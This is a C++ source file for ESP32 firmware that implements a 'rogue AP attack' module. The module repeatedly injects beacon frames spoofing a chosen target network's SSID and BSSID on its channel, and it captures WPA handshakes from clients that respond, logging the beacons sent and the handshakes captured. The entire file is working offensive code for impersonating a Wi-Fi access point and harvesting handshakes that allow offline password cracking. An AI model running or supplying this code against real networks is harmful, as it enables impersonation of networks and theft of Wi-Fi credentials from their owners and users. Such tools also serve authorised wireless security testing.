#include "rogue_ap_attack.h"

#include "esp_log.h"
#include "esp_timer.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_frame_injector.h"
#include "wifi_packet_analyzer.h"

namespace xiaozhi {

static const char* TAG = "RogueApAttack";

RogueApAttack::RogueApAttack(WifiFrameInjector* injector, WifiPacketAnalyzer* analyzer)
    : frame_injector_(injector), packet_analyzer_(analyzer) {
}

esp_err_t RogueApAttack::Execute(const RogueApAttackConfig& config,
                                 const std::atomic<bool>* abort_flag,
                                 AttackStatistics& stats) {
  ESP_LOGI(TAG, "Starting rogue AP attack");
  ESP_LOGI(TAG, "Target SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d",
           config.target_ssid.c_str(),
           config.target_bssid[0], config.target_bssid[1], config.target_bssid[2],
           config.target_bssid[3], config.target_bssid[4], config.target_bssid[5],
           config.channel);

  // Start packet capture
  packet_analyzer_->EnableHandshakeDetection(true);
  esp_err_t ret = packet_analyzer_->StartCapture(config.channel);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "Failed to start packet capture");
    return ret;
  }

  // Initialize statistics
  stats.frames_sent = 0;
  stats.handshakes_captured = 0;
  int64_t start_time_us = esp_timer_get_time();

  // Attack loop: broadcast beacons and capture responses
  while (true) {
    // Check abort flag
    if (abort_flag && abort_flag->load()) {
      ESP_LOGI(TAG, "Rogue AP attack aborted by user");
      break;
    }

    // Check timeout
    int64_t now_us = esp_timer_get_time();
    int64_t elapsed_us = now_us - start_time_us;
    stats.elapsed_seconds = elapsed_us / 1000000;

    if (stats.elapsed_seconds >= config.duration_seconds) {
      ESP_LOGI(TAG, "Rogue AP attack completed (timeout)");
      break;
    }

    // Inject beacon frame
    ret = frame_injector_->InjectBeaconFrame(
        config.target_bssid,
        config.target_ssid.c_str(),
        config.channel,
        kBeaconInterval);

    if (ret == ESP_OK) {
      stats.frames_sent++;
    }

    // Check for captured handshakes
    auto handshakes = packet_analyzer_->GetHandshakes();
    stats.handshakes_captured = handshakes.size();

    // Wait before next beacon
    vTaskDelay(pdMS_TO_TICKS(kBeaconBroadcastIntervalMs));

    // Log progress every 10 seconds
    if (stats.elapsed_seconds % 10 == 0 && stats.elapsed_seconds > 0) {
      static uint32_t last_log_second = 0;
      if (stats.elapsed_seconds != last_log_second) {
        ESP_LOGI(TAG, "Progress: %lu handshakes captured, %lu beacons sent",
                 stats.handshakes_captured, stats.frames_sent);
        last_log_second = stats.elapsed_seconds;
      }
    }
  }

  // Stop capture
  packet_analyzer_->StopCapture();

  ESP_LOGI(TAG, "Rogue AP attack finished: %lu handshakes captured, %lu beacons sent",
           stats.handshakes_captured, stats.frames_sent);

  return ESP_OK;
}

}  // namespace xiaozhi
